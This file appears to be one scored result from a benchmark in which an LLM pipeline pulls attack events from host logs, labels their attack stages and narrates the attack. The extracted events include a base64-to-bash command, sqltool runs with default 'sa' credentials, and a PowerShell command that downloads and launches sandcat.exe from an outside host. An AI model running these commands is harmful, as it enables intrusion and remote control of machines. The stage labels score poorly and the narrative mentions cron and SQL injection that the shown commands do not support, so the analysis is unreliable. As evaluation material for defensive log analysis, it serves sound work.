@@ -1,0 +1,96 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 294687 294943 295048 294944 295049",
+        "stage": "Persistence"
+      },
+      {
+        "command": "bash -c rm ./sqltool_amd64_upx ; rm /tmp/sandcat-linux -r ; rm #{collection.path.name}/webapps/ROOT/logout.jsp -r",
+        "stage": "Persistence"
+      },
+      {
+        "command": "bash -c del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Persistence"
+      },
+      {
+        "command": "bash -c del /f c:\\\\windows\\\\logout.jsp",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sh -c /usr/local/hostguard/bin/curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\\\Users\\\\Public\\\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\\\Users\\\\Public\\\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252...'",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\\\Users\\\\Public\\\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\\\Users\\\\Public\\\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 ...'",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attack began with an initial access via a Base64 encoded string executed through Bash, likely delivered as a payload over a remote channel. It continued with persistence techniques involving CPU usage monitoring scripts and removal of files related to logout functionalities. The attacker used SQL injection tools to gain further control and execute PowerShell commands for downloading malware ('sandcat.exe'). Further execution involved running scheduled tasks using `cron` and `update-motd`, indicating attempts to maintain long-term presence and avoid detection. The collection phase included scanning network sockets to gather sensitive information.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 48450,
+      "completion_tokens": 4627,
+      "total_tokens": 53077,
+      "wall_clock_s": 88.535,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.38461538461538464,
+      "recall": 0.625,
+      "f1": 0.4761904761904762,
+      "tp": 5,
+      "fp": 8,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.07692307692307693,
+      "recall": 0.14285714285714285,
+      "f1": 0.1,
+      "tp": 1,
+      "fp": 12,
+      "fn": 6,
+      "recall_partial": 0.35714285714285715
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 48450,
+      "completion_tokens": 4627,
+      "total_tokens": 53077,
+      "wall_clock_s": 88.535,
+      "parse_retries": 1
+    }
+  }
+}
